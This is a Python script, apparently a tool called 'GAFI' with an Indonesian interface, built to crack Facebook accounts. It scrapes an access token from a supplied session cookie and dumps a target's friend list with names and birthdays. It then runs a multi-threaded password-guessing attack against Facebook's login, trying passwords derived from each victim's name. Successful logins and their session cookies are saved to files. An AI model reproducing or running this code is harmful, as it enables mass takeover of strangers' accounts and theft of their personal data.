def author(pm_aink):
	__raka_andrian___(f'{K} +{P}•{K}+{P} Tunggu Sebentar Nanti Diarahin Ke Facebook ...')
	time.sleep(3)
	os.system("xdg-open https://www.facebook.com/aa.raka27")
	back()

P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
bv = '\33[0;36m'
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
import requests,json,os,sys,random,datetime,time,re,zlib,subprocess,base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
from rich import pretty
pretty.install()
CON=sol()
ses=requests.Session()
raka_andrian_tara,king_off_raka = [],[]
owh_jelas_donk_aink_kan_cowok = []
raka1,raka2,raka3,raka4,raka,rakaxxx,uid,tokenku,akun,id,id2,ok,cp,loop = [],[],[],[],[],[],[],[],[],[],[],0,0,0
sys.stdout.write('\x1b]2; Raka | GAFI \x07')
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def ___raka_ganteng___():
	clear()
	sol().print(f"""{H2}
         ▄████  ▄▄▄        █████▒██▓
        ██▒ ▀█▒▒████▄    ▓██   ▒▓██▒
{K2}       ▒██░▄▄▄░▒██  ▀█▄  ▒████ ░▒██▒
       ░▓█  ██▓░██▄▄▄▄██ ░▓█▒  ░░██░
{M2}       ░▒▓███▀▒ ▓█   ▓██▒░▒█░   ░██░
        ░▒   ▒  ▒▒   ▓▒█░ ▒ ░   ░▓  
         ░   ░   ▒   ▒▒ ░ ░      ▒ ░""")    
	sol().print("%s      ╔═════════════════════════════╗"%(Z2))
	sol().print("%s      ║%s  Github   : Bajingan-Z      %s║"%(Z2,B2,Z2))
	sol().print("%s      ║%s  Version  : %s3.0             %s║"%(Z2,B2,H2,Z2))
	sol().print("%s      ╚═════════════════════════════╝"%(Z2))
def gafi_login():
	os.system('clear')
	___raka_ganteng___()
	ses = requests.Session()
	sol().print(f' {M2}● {K2}● {H2}●')
	print()
	__raka_andrian___(f'{K} +{P}•{K}+{P} Gunakan Cookies Yang Masih Prawan...?')
	cok=input(f'{K} +{P}•{K}+{P} Cookies : {K}')
	try:
		head = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"}; link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok}); find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find)==0: __raka_andrian___(f'{K} +{P}•{K}+ {P}Cookie Anda Invalid'); time.sleep(2); gafi_login()
		else:
			for x in find:
				xz = ses.get(f"https://web.facebook.com/adsmanager/manage/campaigns?act={x}&nav_source=no_referrer", headers = head, cookies={"cookie": cok}); took = re.search('(EAAB\w+)',xz.text).group(1); took = open(".token.txt","w").write(took); cok= open(".cok.txt","w").write(cok);__raka_andrian___(f"\n{K} +{P}•{K}+{P} Login Berhasil Jalankan Ulang Perintahnya ...");exit();os.system('rm -rf .token.txt && rm -rf .cok.txt');print(e);time.sleep(3)
	except Exception as e:exit(e)

def rakaexde():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			tim_gafi = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			gafi_donk = json.loads(tim_gafi.text)['name']
			menu(gafi_donk)
		except KeyError:
			gafi_login()
		except requests.exceptions.ConnectionError:
			print()
			__raka_andrian___(f'{K} +{P}•{K}+{P} Jaringan Error')
			exit()
	except IOError:
		gafi_login()
		
def Dump_Friendlist(idt,fields,cookie,token):
	try:
		headers = {"connection": "keep-alive", "accept": "*/*", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors","sec-fetch-site": "same-origin", "sec-fetch-user": "?1","sec-ch-ua-mobile": "?1","upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9"}
		if len(id)==0:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday)"}
		else:
			params = {"access_token": token,"fields": f"name,friends.fields(id,name,birthday).after({fields})"}
		url = ses.get(f"https://graph.facebook.com/{idt}", params=params, headers=headers, cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"]); sys.stdout.write(f"\r {K}+{P}•{K}+{P} Total Id : {len(id)}"), sys.stdout.flush()
		Dump_Friendlist(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except: pass

def menu(name):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		__raka_andrian___(f'{K} +{P}•{K}+{P} Cookies Kadaluarsa Kea Tt Jendes ')
		time.sleep(3)
		gafi_login()
	os.system('clear')
	___raka_ganteng___()
	sol().print(f' {M2}● {K2}● {H2}●')
	print()
	__raka_andrian___(f'{K} +{P}A{K}+{P} Crack Publik\n{K} +{P}B{K}+{P} Laporkan Bug\n{K} +{P}L{K}+{P} Keluar\n')
	_raka_andrian_tara_ = input(f'{K} +{P}•{K}+{P} Pilih  : ')
	if _raka_andrian_tara_ in ['01','1','a','A']:
		idt = input(f'{K} +{P}•{K}+ {P}Target   : '); Dump_Friendlist(idt,"",{"cookie":cok},token);perintah()
	elif _raka_andrian_tara_ in ['02','2','b','B']:
		author('pm_aink')
	elif _raka_andrian_tara_ in ['00','0','l','L']:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		__raka_andrian___(f'{K} +{P}•{K}+{P} Succes Menghapus Cookie Good Bay...')
		time.sleep(3)
		exit()
	else:
		__raka_andrian___(f'{K} +{P}•{K}+{P} Pilih Yang Benar Kentod...?')
		time.sleep(4)
		back()

def perintah():
	for rakaxc in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,rakaxc)
	print('')
	meki = input(f"{K} +{P}•{K}+{P} Tambahkan Password Manual {H}y{P}/{K}t{P} : {K}")
	if meki in ["y","Y"]:
		raka_andrian_tara.append("ya")
		pastam = input(f"{K} +{P}•{K}+{P} Masukan Tambahan : {K}")
		pwtod = pastam.split(",")
		for pwlist in pwtod:
			king_off_raka.append(pwlist)
	else:pass
	input(f'{K} +{P}•{K}+{P} Tekan Enter Untuk Mulai Crack')
	rakaxxx.append('async');seting_password()

def seting_password():
	global prog,des
	prog = Progress(TextColumn('{task.description}'))
	des = prog.add_task('',total=len(id))
	os.system('clear')
	print()
	with prog:
		with tred(max_workers=30) as rakaANDRIAN:
			for kocak_euy in id2:
				idf,nmf = kocak_euy.split('|')[0],kocak_euy.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				afa_aja_boleh = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						afa_aja_boleh.append(frs+'123')
						afa_aja_boleh.append(frs+'321')
						afa_aja_boleh.append(frs+'1234')
						afa_aja_boleh.append(frs+'123456')
						afa_aja_boleh.append(frs+'0'+str(random.randint(1,9)))
						afa_aja_boleh.append(frs+'2'+str(random.randint(1,9)))
				else:
					if len(frs)<3:
						afa_aja_boleh.append(nmf)
					else:
						afa_aja_boleh.append(nmf)
						afa_aja_boleh.append(frs+'123')
						afa_aja_boleh.append(frs+'1234')
						afa_aja_boleh.append(frs+'12345')
						afa_aja_boleh.append(frs+'1'+str(random.randint(1,9)))
				if 'ya' in raka_andrian_tara:
					for recode_aja in king_off_raka:
						afa_aja_boleh.append(recode_aja)
				else:pass
				if 'async' in rakaxxx:
					rakaANDRIAN.submit(_async_2_,idf,afa_aja_boleh)
				else:
					rakaANDRIAN.submit(_async_2_,idf,afa_aja_boleh)
		print('')
		print(f'{K} +{P}•{K}+{P} Hasil : %s\n{K} +{P}•{K}+{P} Hasil : %s'%(okc,cpc))
		print('')
		print(f'{K} +{P}•{K}+{P} OK : {H}%s '%(ok))
		print(f'{K} +{P}•{K}+{P} CP : {K}%s '%(cp))
		print('')

def UserAgent(idf):
	rr = random.randint; rc = random.choice
	model1 = rc(["SM-M405F", "SM-M405FN", "SM-M405G", "SM-M426B", "SM-M426B/DS","SM-M526BR", "SM-M526BR/DS", "SM-M526B", "SM-M526B/DS", "SM-N981B", "SM-N981B/DS", "SM-N981U", "SM-N981U1", "SM-N981W", "SM-N9810", "SM-N981N"])
	model2 = rc(["RMX3687", "RMX3686", "RMX2202", "RMX3740"])
	ua1 = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.80"
	ua2 = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
	ua3 = f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
	ua4 = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
	ua5 = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
	base = rc([ua1, ua2, ua3, ua4, ua5])
	return base

def _async_2_(idf,afa_aja_boleh):
	global loop,ok,cp
	rr = random.randint; rc = random.choice
	rakaxtc = random.choice([U,B,H,K,M])
	prog.update(des,description=f'\r {rakaxtc}GAFI {P}{(loop)}/{len(id)} Ok;{H2}{(ok)} {P}Cp;{K2}{(cp)}')
	prog.advance(des)
	ua = UserAgent(idf)
	ses = requests.Session()
	dataku, headersku = {}, {}
	for pw in afa_aja_boleh:
		pw = pw.lower()
		try:
			req1 = ses.get('https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0').text
			data = {'jazoest':re.search('name="jazoest" value="(.*?)"',str(req1)).group(1),'lsd':re.search('name="lsd" value="(.*?)"',str(req1)).group(1),'api_key':'124024574287414','cancel_url':'https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_','display':'page','isprivate':'','return_session':'','skip_api_login':1,'signed_next':1,'trynum':1,'timezone':'-420','lgndim':re.search('name="lgndim" value="(.*?)"',str(req1)).group(1),'lgnrnd':re.search('name="lgnrnd" value="(.*?)"',str(req1)).group(1),'lgnjs':re.search('name="lgnjs" value="(.*?)"',str(req1)).group(1),'email':idf,'prefill_contact_point':'','prefill_source':'browser_dropdown','prefill_type':'password','first_prefill_source':'browser_dropdown','first_prefill_type':'contact_point','had_cp_prefilled':True,'had_password_prefilled':True,'ab_test_data':'','encpass':f"#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}"}
			head = {'Host': 'business.facebook.com','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datr = re.search('_js_datr","(.*?)"',str(req1)).group(1)
			coki = f'datr={datr};locale=id_ID;wl_cbv=v2%3Bclient_version%3A2392%3Btimestamp%3A{int(time.time())};vpd=v1%3B885x360x2;wd=980x1715;{";".join(["%s=%s"%(x,y) for x,y in ses.cookies.get_dict().items()])};_js_datr={datr}'
			req2 = ses.post('https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified%26cbt%3D1705563202091&lwv=100', data=data, headers=head, cookies={'cookie':coki}, allow_redirects=False)
			if 'checkpoint' in ses.cookies.get_dict().keys():
				tree = Tree(f"{P2}")
				tree.add(f"{P2}/sdcard/Cp {K2}{tgl}{P2}-{K2}{bln}{P2}-{K2}{thn}{P2}").add(f"{K2}{idf} {P2}• {K2}{pw}{P2}")
				tree.add(f"{K2}{ua}{P2}")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"{P2}")
				tree.add(f"{P2}/sdcard/Ok {H2}{tgl}{P2}-{H2}{bln}{P2}-{H2}{thn}{P2}").add(f"{H2}{idf} {P2}• {H2}{pw}{P2}")
				tree.add(f"{H2}{kuki}{P2}")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1

def clear():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass

def back():
	rakaexde()

def __raka_andrian___(raka):
        for e in raka + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.007)

def __raka_andrian___2__(raka):
        for e in raka + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.030)			

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('clear')
	except:pass
	rakaexde()